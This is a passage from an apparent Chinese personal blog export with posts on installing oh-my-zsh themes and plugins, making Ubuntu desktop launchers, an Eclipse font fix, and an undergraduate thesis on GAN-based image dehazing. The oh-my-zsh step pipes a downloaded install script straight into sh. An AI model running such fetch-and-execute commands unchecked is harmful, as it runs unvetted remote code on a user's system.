Zsh</span></span><br><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br></pre></td></tr></table></figure><h2 id="2-主题配置"><a href="#2-主题配置" class="headerlink" title="2. 主题配置"></a>2. 主题配置</h2><p>打开~/.zshrc文件，更改ZSH_THEME字段,我这里选择的是agnoster主题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=&quot;agnoster&quot;</span><br></pre></td></tr></table></figure><p>额外推荐 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JoaWxidXJuL3Bvd2VybGV2ZWw5aw==" title="https://github.com/bhilburn/powerlevel9k">Powerlevel9k<i class="fa fa-external-link"></i></span>主题，样子如下图，如果要使用Powerlevel9k主题，需要手动安装它：</p><p><img data-src="https://ae01.alicdn.com/kf/Hefe68429ca144cf6ba8031488499a0adJ.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bhilburn/powerlevel9k.git ~/.oh-my-zsh/custom/themes/powerlevel9k</span><br></pre></td></tr></table></figure><p>并修改.zshrc文件的ZSH_THEME字段为:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=&quot;powerlevel9k/powerlevel9k&quot;</span><br></pre></td></tr></table></figure><p>上述两个主题<strong>都依赖powerline字体</strong>，不然会有乱码现象，可通过以下命令安装powerline字体:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/powerline/powerline/develop/font/10-powerline-symbols.conf</span><br><span class="line">wget https://raw.githubusercontent.com/powerline/powerline/develop/font/PowerlineSymbols.otf</span><br><span class="line">sudo mkdir /usr/share/fonts/OTF</span><br><span class="line">sudo cp 10-powerline-symbols.conf /usr/share/fonts/OTF/</span><br><span class="line">sudo mv 10-powerline-symbols.conf /etc/fonts/conf.d/</span><br><span class="line">sudo mv PowerlineSymbols.otf /usr/share/fonts/OTF/</span><br></pre></td></tr></table></figure><h2 id="3-常用插件配置"><a href="#3-常用插件配置" class="headerlink" title="3.  常用插件配置"></a>3.  常用插件配置</h2><h3 id="3-1-zsh-autosuggestions-历史命令提示插件"><a href="#3-1-zsh-autosuggestions-历史命令提示插件" class="headerlink" title="3.1 zsh-autosuggestions 历史命令提示插件"></a>3.1 zsh-autosuggestions 历史命令提示插件</h3><p>执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><h3 id="3-2-zsh-syntax-highlighting-语法高亮"><a href="#3-2-zsh-syntax-highlighting-语法高亮" class="headerlink" title="3.2 zsh-syntax-highlighting 语法高亮"></a>3.2 zsh-syntax-highlighting 语法高亮</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure><h3 id="3-3-配置-zshrc文件使插件生效"><a href="#3-3-配置-zshrc文件使插件生效" class="headerlink" title="3.3 配置.zshrc文件使插件生效"></a>3.3 配置.zshrc文件使插件生效</h3><p>打开~/.zshrc文件，找到plugin字段，修改为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plugins=( </span><br><span class="line">git  </span><br><span class="line">z # 快速跳转插件（oh-my-zsh自带，不用安装）</span><br><span class="line">web-search # 命令行中使用搜索引擎 (自带)</span><br><span class="line">zsh-syntax-highlighting </span><br><span class="line">zsh-autosuggestions </span><br><span class="line">) </span><br></pre></td></tr></table></figure><ul><li><p>z插件是快速实现目录跳转的，比如你现在在<code>/home/raven/Desktop</code>目录，曾经去过<code>/home/raven/Downloads</code>目录，那么可以直接输入<code>z Dow</code>然后tab一下，它会自动补全Downloads的绝对路径。</p></li><li><p>web-search 是命令行中快速使用搜索引擎的插件，输入baidu xxx或者google xxx即可。个人觉得用处不算大。</p></li></ul><h2 id="4-最后"><a href="#4-最后" class="headerlink" title="4. 最后"></a>4. 最后</h2><p>最后source ~/.zshrc或者重启电脑就ok。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OhMyZsh </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu小技巧-添加桌面图标</title>
      <link href="/archives/45ed2e8e.html"/>
      <url>/archives/45ed2e8e.html</url>
      
        <content type="html"><![CDATA[<p>说来惭愧，用linux还是比较久了，每次想要添加桌面的图标的时候总是要百度一下，所以这里就记录一下，加深印象。</p><p>首先要知道的是，如果想要添加自己的桌面图标，我们需要在**/usr/share/applications<strong>目录下创建一个</strong>xxx.desktop<strong>的文件，</strong>xxx**为你应用名。</p><p>比如，我要创建一个微信的desktop，那么执行以下命令：</p><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /usr/share/applications/wechat.desktop</span><br></pre></td></tr></table></figure><p>然后，输入以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 文件头，必须，告诉系统这是一个desktop文件</span><br><span class="line">[Desktop Entry]</span><br><span class="line">&#x2F;&#x2F; 图标名</span><br><span class="line">Name&#x3D;wechat</span><br><span class="line">&#x2F;&#x2F; 应用类型</span><br><span class="line">Type&#x3D;Application</span><br><span class="line">&#x2F;&#x2F; 可执行文件路径，需要替换为你的可执行文件路径</span><br><span class="line">Exec&#x3D;&#x2F;home&#x2F;dnt&#x2F;下载&#x2F;electronic-wechat-linux-x64&#x2F;electronic-wechat</span><br><span class="line">&#x2F;&#x2F; 图标路径，需要替换为你的图标路径</span><br><span class="line">Icon&#x3D;&#x2F;home&#x2F;dnt&#x2F;图片&#x2F;wx.png</span><br><span class="line">&#x2F;&#x2F; 鼠标经过上面时的提示名称</span><br><span class="line">Comment&#x3D;wechat</span><br><span class="line">&#x2F;&#x2F; 打开应用程序时，是否需要打开termial，一般为false</span><br><span class="line">Terminal&#x3D;false</span><br></pre></td></tr></table></figure><p>这样就可以用super键时，看到该应用出现在列表中了。但有时候我们像更方便一点，<strong>类似于windows下的一个创建快捷方式到桌面，在ubuntu桌面上页创建一个图标，点击它就可以打开应用程序</strong>。于是可以这样做：<br>将刚才创建的desktop文件复制一份到桌面上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/applications/wechat.desktop ~/Desktop   # 注意不要用sudo命令，否则后期需要更改所属主</span><br></pre></td></tr></table></figure><p>然后到桌面找到刚才复制的desktop文件，右键-&gt;属性-&gt;权限，打钩以下选项：</p><p><img data-src="https://ae01.alicdn.com/kf/H435e931f3af14463b434c19abb794e66C.jpg"></p><p>最后双击图标就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 桌面图标 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>坑记录-ubuntu中的eclipse不显示下划线解决方案</title>
      <link href="/archives/d15edb4a.html"/>
      <url>/archives/d15edb4a.html</url>
      
        <content type="html"><![CDATA[<p>最近在ubuntu上安装了eclipse，却发现写代码时，它不显示下划线。like：</p><p><img data-src="https://ae01.alicdn.com/kf/Hf312184e2fca45b7a6bc89beb8678a13T.jpg"></p><p>最后发现是因为eclipse对monospace字体的显示支持不太好，更改一个字体就好了，更改方式：</p><a id="more"></a><p><img data-src="https://ae01.alicdn.com/kf/H4432039bb95c45a2b31ed9afdeab0967Z.jpg"></p><p>个人最后使用的字体为<strong>Ubuntu Mono</strong>。</p><p>效果如下：</p><p><img data-src="https://ae01.alicdn.com/kf/Hb6171a9ec53e4c95b1129ecb1b0ff330t.jpg"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><span class="exturl" data-url="aHR0cDovL2NuLnZvaWRjYy5jb20vcXVlc3Rpb24vcC1oZnVuamN5YS1jdy5odG1s" title="http://cn.voidcc.com/question/p-hfunjcya-cw.html">如何在Eclipse中再次显示下划线？<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> eclipse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设总结五-杂项</title>
      <link href="/archives/2caf6b87.html"/>
      <url>/archives/2caf6b87.html</url>
      
        <content type="html"><![CDATA[<p>i&gt; 本科毕设题目为《基于深度学习的图像去雾方法研究与实现》</p><p>毕设总结系列：</p><ul><li><a href="https://www.ravenxrz.ink/archives/880ba6e.html">毕设总结零–绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/a513887d.html">毕设总结一–传统去雾理论</a></li><li><a href="https://www.ravenxrz.ink/archives/81fcc536.html">毕设总结二–论文复现工作1–暗通道去雾(DCP)</a></li><li><a href="https://www.ravenxrz.ink/archives/15ae521b.html">毕设总结三–论文复现工作2–MSCNN去雾</a></li><li><a href="https://www.ravenxrz.ink/archives/6631bc9b.html">毕设总结四–最终去雾方案的确定与实现–DeBlurGanToDehaze</a></li><li><a href="https://www.ravenxrz.ink/archives/2caf6b87.html">毕设总结五–杂项</a><a id="more"></a><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.  前言"></a>1.  前言</h2></li></ul><p>上一篇文章中，介绍了笔者在毕设中所采用的去雾方法及其代码实现。这一篇算是总结一些在毕设过程中的一些杂项事物，以及收尾吧。</p><h2 id="2-一些杂项"><a href="#2-一些杂项" class="headerlink" title="2.  一些杂项"></a>2.  一些杂项</h2><h3 id="2-1-去雾新想法"><a href="#2-1-去雾新想法" class="headerlink" title="2.1 去雾新想法"></a>2.1 去雾新想法</h3><ul><li>CycleGan的思想其实也很有趣，但是我没有去实现了，算是一个思路吧。</li><li>DeBlurGan中可以尝试把ResBlock改为DenseBlock，但是注意DenseBlock很容易显存爆炸，我当初是实现了DenseBlock的，但是无奈显存直接爆炸了。曾经看过Pytorch似乎可以解决DenseBlock显存爆炸的问题，但是keras暂时还没有。显存爆炸的原因我已经忘记了，所以无法贴出相关链接。但是当时是在Github的issue上看到的，算是一条线索吧。</li></ul><h3 id="2-2-展望与不足"><a href="#2-2-展望与不足" class="headerlink" title="2.2 展望与不足"></a>2.2 展望与不足</h3><ul><li><p>虽然没有实际测试服务器的去雾速度，但是个人感觉还是很快的。那么这样其实可以做一个<strong>视频实时去雾</strong>的应用，比如在咱们重庆高速公路上雾天天气还是蛮频繁的，做一个实时去雾处理可以大大降低车祸事故率。<strong>什么？担心上传雾图下载雾图速度慢？</strong>5G都要来了，咱应该不怕这个。更何况也可以把网络迁移到硬件设备上去，参考<span class="exturl" data-url="aHR0cHM6Ly93d3cudGVuc29yZmxvdy5vcmcvbGl0ZQ==" title="https://www.tensorflow.org/lite">TensorFlow Lite<i class="fa fa-external-link"></i></span>。</p><hr><p><strong>————-下段话已过时。————-</strong></p><p>如果有读过我的代码的小伙伴，肯定知道不论是train还是test，我都把整个网络的输入固定了size，这就造成了整个网络只接受固定size的图片，其余size的图片需要做resize处理，resize肯定会失真，这是一个缺点。修复这个缺点的重点有两个：</p><ol><li>把判别网络后两个FC层改为多个卷积层，那就实现了整个网络（包括生成网络和判别网络）为全卷积网络，如此一来可以接收任意size的图片了。</li><li>据个人所知，Keras和TensorFlow这两种框架必须固定输入size，要想实现任意size，可用matlab（matlab是基于操作来实现的，所以肯定可以实现全卷积），其余框架如caffe,pytorch等等我没有学习，无法给出确定答案。</li></ol><hr><p><strong>2019/8/27更新</strong></p><p>感谢评论区**@lihanyu1204**的提醒，理论上keras和tensorflow是可以接收任意size的输入的（前提是你的网络为全卷积）。个人试验后也的确如此，不过建议train时还是要固定size，test可不固定。另外，如果固定了输入size来train，判别网络也就不用将后两个FC层更改为卷积层了。代码实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;train&#x27;</span>:</span><br><span class="line">       inputs = Input(shape=image_shape)</span><br><span class="line">   <span class="keyword">elif</span> mode == <span class="string">&#x27;test&#x27;</span>:</span><br><span class="line">       inputs = Input(shape=(<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>其中<code>image_shape</code>是固定的图片大小，在我的代码里为<code>(256,256,3)</code>。</p><p>当然了，这只是理论上可以接收任意size，实际情况还要看你的网络结构，由于我的网络设计已经固定，<strong>在不修改网络结构的情况下只能接收图片宽高能整除4的这类图片。</strong>因为我的网络结构最前两层卷积降维，最后两层升维，且单次升降仅让图片size乘2或除2。如果遇到输入不能整除4的情况，会造成输入输出的size不一致。例如输入为450, 经过第一层为225,第二层为113（padding=’same’的情况下，向上取整），倒数第二层为226，最后一层输出为452。所以我的网络只能接收能整除4的。</p><p><strong>如果你要考虑接收任意size，则要考虑好网络结构。</strong></p><hr><p><strong>新问题</strong></p><p>不过这样又会引发一个新问题，那就是在keras的predict函数中所接受的输入需要具有相同的shape，否则会报错。个人的解决方案是采用循环predict，每次循环仅predict一张图片。不知道keras有不有相应的predict函数能够适应不同的输入大小。</p></li></ul><h3 id="2-3-Android-app展示去雾？"><a href="#2-3-Android-app展示去雾？" class="headerlink" title="2.3   Android app展示去雾？"></a>2.3   Android app展示去雾？</h3><p>看过本系列四的同学，应该注意到我在文末贴了一个视频，演示的是Android App上传图片到服务器，服务器处理回传后Android显示的效果。请注意那个时候Android app和服务器并不是在一个局域网内，因为我做这个app的初衷是为了答辩演示，答辩的时候肯定和寝室的台式机不在一个局域网内，于是做了内网穿透。关于这段实现过程，可参见我的另一篇博文</p><p>[post cid=”194” /]</p><h3 id="2-4-Latex-写毕设论文？"><a href="#2-4-Latex-写毕设论文？" class="headerlink" title="2.4 Latex 写毕设论文？"></a>2.4 Latex 写毕设论文？</h3><p>说到Latex，我真的是又爱又恨。爱的是他的简单美观，恨的是他的复杂难看。看到这里的小伙伴一定觉得我疯了，说了一堆反义词。但是Latex就是这样，<strong>如果有提供好的Latex模板</strong>，那写起来就很舒服，就像一个程序你只用给它一个简单输入，它在后台帮你把所有排版、公式编号、插图等等全部安排好。<strong>如果没有提供好的模板</strong>，那就要自己去实现，我花了一个星期的时间努力搞出本校的模板，但是我放弃了，太多细节的东西没法修复实现（全怪自己是Latex的弱鸡）。后来Latex对我来说的唯一作用就是拿来写公式，再转到word中去。</p><p>i&gt; 所以一条建议：先去TexStudio工作室搜搜有不有你本校的模板，没有的话尽量就用word编排，当然如果你对自己的Latex能力有信心，那就做一份吧，还能为你本校的后辈们留点东西，方便后辈们写论文咯。</p><p>[post cid=”145”/]</p><h3 id="2-5-其他参考资料"><a href="#2-5-其他参考资料" class="headerlink" title="2.5 其他参考资料"></a>2.5 其他参考资料</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9yYW1oaXNlci5jb20vcG9zdC8yMDE4LTA1LTE0LWF1dG9lbmNvZGVycy13aXRoLWtlcmFzLw==" title="https://ramhiser.com/post/2018-05-14-autoencoders-with-keras/">自编码器 Autoencoders with Keras<i class="fa fa-external-link"></i></span></li><li>[Kears中如何保存模型？](How to Check-Point Deep Learning Models in Keras)</li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTQyODEzOTIvYXJ0aWNsZS9kZXRhaWxzLzc1MTUyODA5" title="https://blog.csdn.net/u014281392/article/details/75152809">经典CNN之：VGGNet - 机器会学习的博客 - CSDN博客<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTA2NTIzL2FydGljbGUvZGV0YWlscy83OTc2OTU3MQ==" title="https://blog.csdn.net/qq_38906523/article/details/79769571">深度学习—残差resnet网络原理详解 - Dean - CSDN博客<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9teS5vc2NoaW5hLm5ldC91Lzg3NjM1NC9ibG9nLzE2MjI4OTY=" title="https://my.oschina.net/u/876354/blog/1622896">大话深度残差网络（DRN）ResNet网络原理 - 雪饼的个人空间 - OSCHINA<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTQzODAxNjUvYXJ0aWNsZS9kZXRhaWxzLzc1MTQyNjY0Lw==" title="https://blog.csdn.net/u014380165/article/details/75142664/">DenseNet算法详解 - AI之路 - CSDN博客<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZGNvdXR6eXgvYXJ0aWNsZS9kZXRhaWxzLzU0MDI1MjQz" title="https://blog.csdn.net/stdcoutzyx/article/details/54025243">感知损失(Perceptual Losses)<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9idXB0bGR5LmdpdGh1Yi5pby8yMDE2LzEwLzI5LzIwMTYtMTAtMjktZGVjb252Lw==" title="https://buptldy.github.io/2016/10/29/2016-10-29-deconv/">转置卷积、去卷积概念梳理<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phY2tlMTIxL2FydGljbGUvZGV0YWlscy83OTg3NDU1NQ==" title="https://blog.csdn.net/jacke121/article/details/79874555">训练loss不下降原因集合 - jacke121的专栏 - CSDN博客<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81MDc1NzQyMQ==" title="https://zhuanlan.zhihu.com/p/50757421">图像质量评价指标之 PSNR 和 SSIM - 知乎<i class="fa fa-external-link"></i></span></li></ul><h2 id="3-结语"><a href="#3-结语" class="headerlink" title="3. 结语"></a>3. 结语</h2><p>总算是写到了本系列的最后一篇文章了，这个系列的结束，基本上意味着我在学校的最后工作也做完了，感谢在毕设5个月来一直帮助我的师兄，<br>接下来就是浪咯，好久没玩游戏了，最近应该也不会更新博文了吧，去放松一把啦。</p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图像去雾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设总结四-最终去雾方案的确定与实现-DeBlurGanToDehaze</title>
      <link href="/archives/6631bc9b.html"/>
      <url>/archives/6631bc9b.html</url>
      
        <content type="html"><![CDATA[<p>i&gt; 本科毕设题目为《基于深度学习的图像去雾方法研究与实现》</p><p>毕设总结系列：</p><ul><li><a href="https://www.ravenxrz.ink/archives/880ba6e.html">毕设总结零–绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/a513887d.html">毕设总结一–传统去雾理论</a></li><li><a href="https://www.ravenxrz.ink/archives/81fcc536.html">毕设总结二–论文复现工作1–暗通道去雾(DCP)</a></li><li><a href="https://www.ravenxrz.ink/archives/15ae521b.html">毕设总结三–论文复现工作2–MSCNN去雾</a></li><li><a href="https://www.ravenxrz.ink/archives/6631bc9b.html">毕设总结四–最终去雾方案的确定与实现–DeBlurGanToDehaze</a></li><li><a href="https://www.ravenxrz.ink/archives/2caf6b87.html">毕设总结五–杂项</a><a id="more"></a><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2></li></ul><p>上一篇文章中，我们介绍了MSCNN的去雾方法以及MSCNN的Keras实现。这篇文章中将介绍笔者的毕设中所采用的去雾结构。</p><h2 id="2-去雾前夕"><a href="#2-去雾前夕" class="headerlink" title="2.  去雾前夕"></a>2.  去雾前夕</h2><h3 id="2-1-端到端的去雾网络"><a href="#2-1-端到端的去雾网络" class="headerlink" title="2.1 端到端的去雾网络"></a>2.1 端到端的去雾网络</h3><p>在总结系列的一、二、三中，我们所介绍的理论和去雾方法均是以大气散射模型为基础，以估参作为重点研究过程，包括Aod-Net[1]虽然不是单独估计透射图和大气光，但仍离不开估参。已估参为主的这些去雾方法始终都有一个弊端：<strong>或多或少的都有额外的误差</strong>。</p><blockquote><p>能不能建立一种端到端的映射网络呢？给网络输入一张雾图，输出得到一张去雾图。</p></blockquote><p>就像总结零曾有过的一张图那样：</p><img data-src="https://ae01.alicdn.com/kf/HTB10.78c8Kw3KVjSZTEq6AuRpXab.jpg"/><p>那什么样的网络可以实现这样的效果呢？</p><p>自2014年生成对抗网络（GAN）提出以来，GAN便以一种新式的训练思想逐渐火热。现在已经很多基于GAN的应用，如图像修补，图像风格转换等等。于是自然而然的，笔者采用了GAN来做上图中的去雾网络。</p><h3 id="2-2-浅谈GAN"><a href="#2-2-浅谈GAN" class="headerlink" title="2.2 浅谈GAN"></a>2.2 浅谈GAN</h3><p>去雾GAN的核心思想如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1EboBdf5G3KVjSZPxq6zI3XXaH.jpg"></p><p>它有两个重要的子网络，<strong>一个生成网络G，一个判别网络D</strong>。现在假设我们手里有三样东西：</p><ul><li>设计精良的生成网络G</li><li>设计精良的判定网络D</li><li>训练这个大网络所需要的 “ 雾图-无雾图” 多个数据对。</li></ul><p>i&gt; 那么这个网络的思想可这样来表达：生成网络G吃一张雾图，吐出一张“假”无雾图，从训练数据集中找到吃掉的雾图的对应“真”无雾图，判别网络D尽自己最大的可能去区分开这“真假”雾图，另一方面，生成网络G尽自己最大的可能去生成接近“真”无雾图的“假”无雾图，用来迷惑判别网络D。两者在这种竞争关系下不断进化，最后达到一种平衡。</p><p>关于GAN的文章，推荐阅读：</p><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNDc2NzA1OQ==" title="https://zhuanlan.zhihu.com/p/24767059">GAN学习指南：从原理入门到制作生成Demo<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29uMndheS9hcnRpY2xlL2RldGFpbHMvNzI3NzM3NzE=" title="https://blog.csdn.net/on2way/article/details/72773771">简单理解与实验生成对抗网络GAN - 我爱智能 - CSDN博客<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VyaWtsaW5kZXJub3Jlbi9LZXJhcy1HQU4=" title="https://github.com/eriklindernoren/Keras-GAN">Keras-GAN<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9waGlsbGlwaS5naXRodWIuaW8vcGl4MnBpeC8=" title="https://phillipi.github.io/pix2pix/">Image-to-Image Translation with Conditional Adversarial Nets的介绍与应用Demo<i class="fa fa-external-link"></i></span></p></li><li><p>[Isola et al_2016_Image-to-Image Translation with Conditional Adversarial Networks](Isola et al_2016_Image-to-Image Translation with Conditional Adversarial Networks.pdf)</p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81N2ZmNmY5NmNlNGM=" title="https://www.jianshu.com/p/57ff6f96ce4c">Patch-GAN Image-to-Image Translation with Conditional Adversarial Networks超细致解析：使用条件Gan经行图像的转换<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xMDY3MDMw" title="https://cloud.tencent.com/developer/article/1067030">17种GAN变体的Keras实现请收好 | GitHub热门开源代码<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnNpY2FyYS5jb20va2VyYXMtZ2VuZXJhdGl2ZS1hZHZlcnNhcmlhbC1uZXR3b3Jrcy1pbWFnZS1kZWJsdXJyaW5nLTQ1ZTNhYjY5NzdiNT9naT1mMWQ1YzUwZTc4MDA=" title="https://blog.sicara.com/keras-generative-adversarial-networks-image-deblurring-45e3ab6977b5?gi=f1d5c50e7800">GAN with Keras: Application to Image Deblurring – Sicara’s blog<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL2F2NTQzMzkwMTI=" title="https://www.bilibili.com/video/av54339012">李宏毅GAN视频教学<i class="fa fa-external-link"></i></span></p></li></ul><h2 id="3-去雾网络结构"><a href="#3-去雾网络结构" class="headerlink" title="3. 去雾网络结构"></a>3. 去雾网络结构</h2><p>前文我们说了GAN有两个核心的子网络，如何分别设计两个网络的结构呢？<strong>反正我是不会设计</strong>，哈哈。嘛，总之这时候我是求助了师兄，师兄丢给了我一篇DeBlur的论文，然后我做了个Transfering Learning。没想到效果相当好，于是就这样抄过来了。</p><p>DeBlur的论文：《DeblurGAN: Blind Motion Deblurring Using Conditional Adversarial Networks》</p><h3 id="3-1-生成网络结构"><a href="#3-1-生成网络结构" class="headerlink" title="3.1 生成网络结构"></a>3.1 生成网络结构</h3><p><img data-src="https://ae01.alicdn.com/kf/HTB1tOehbAxz61VjSZFrq6xeLFXad.jpg"></p><ul><li>2个编码单元提取特征</li><li>9个ResBlock作为特征转换器，将它从雾图特征转到无雾特征</li><li>2个解码单元恢复无雾图</li></ul><p>你要问我为什么这样设计？不好意思，我也不知道。<em>个人觉得深度学习就是一个黑盒子，讲究的是最终效果，往往没有特别好的理论支撑。</em></p><h3 id="3-2-判别网络结构"><a href="#3-2-判别网络结构" class="headerlink" title="3.2 判别网络结构"></a>3.2 判别网络结构</h3><p><img data-src="https://ae01.alicdn.com/kf/HTB1E7evcL1G3KVjSZFkq6yK4XXaa.jpg"></p><p>判别网络参见《Image-to-Image Translation with Conditional Adversarial Networks》中的PatchGAN。<br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW94aWZlaS9hcnRpY2xlL2RldGFpbHMvODY1MDY5NTU=" title="https://blog.csdn.net/xiaoxifei/article/details/86506955">关于PatchGAN的理解 - xiaoxifei的专栏 - CSDN博客<i class="fa fa-external-link"></i></span></p><h2 id="4-损失函数设计"><a href="#4-损失函数设计" class="headerlink" title="4. 损失函数设计"></a>4. 损失函数设计</h2><p>这里损失函数由两项构成：<br>$$<br>L = L_{感知损失} +\lambda L_{对抗损失}<br>$$<br>在说感知损失(perception loss)前，先来看看简单的MSE损失，我们曾在MSCNN网络结构中提到过MSE损失函数。他比较的是生成图与标签图之间的像素级别均方差。<br>$$<br>L(t_i(x),t_i^{\delta}(x)) = \frac{1}{q}\sum_{i=1}^{q}||t_i(x)-t_i^{\delta}(x)||^2<br>$$<br>那什么感知损失？简单的说就是将生成图和标签图在通过一个网络，得到<strong>两张图的特征图</strong>，在这两张特征图上做MSE。一般来说，通过的这个网路会选择VGG网络。感知损失的计算公式如下：<br>$$<br>    L_{感知损失} = \frac{1}{CHW} \sum_{j=1}^{3}<br>    || \phi_j(I^{Label}) - \phi_j(G(I^{haze})) ||^2<br>$$</p><ul><li>$\phi$理解为通过网络的等效函数</li><li>CHW分别代表图像通道数，图像高度和宽度</li></ul><p>paper中的对抗损失采用的是WGAN-GP中的Loss，但是我通过阅读它的源码发现它只采用了wgan loss。虽然我后期想自己修改为wgan-gp loss，但是无奈，WGAN-GP后面的理论真的好多，加上时间已经不够且当时基于WGAN中的loss效果已经很好了，所以最后未能完成修改。</p><p>关于WGAN 和 WAGN-GP推荐阅读：</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0Bqb25hdGhhbl9odWkvZ2FuLXdhc3NlcnN0ZWluLWdhbi13Z2FuLWdwLTZhMWEyYWExYjQ5MA==" title="https://medium.com/@jonathan_hui/gan-wasserstein-gan-wgan-gp-6a1a2aa1b490">GAN — Wasserstein GAN &amp; WGAN-GP – Jonathan Hui – Medium<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI1NzM3MTY5L2FydGljbGUvZGV0YWlscy83ODg1Nzc4OA==" title="https://blog.csdn.net/qq_25737169/article/details/78857788">DCGAN、WGAN、WGAN-GP、LSGAN、BEGAN原理总结及对比 - Double_V的博客 - CSDN博客<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5waWFuc2hlbi5jb20vYXJ0aWNsZS81MTM1MjQxMTA1Lw==" title="http://www.pianshen.com/article/5135241105/">WassersteinGAN-GP<i class="fa fa-external-link"></i></span></li></ul><h2 id="5-实现代码参考"><a href="#5-实现代码参考" class="headerlink" title="5. 实现代码参考"></a>5. 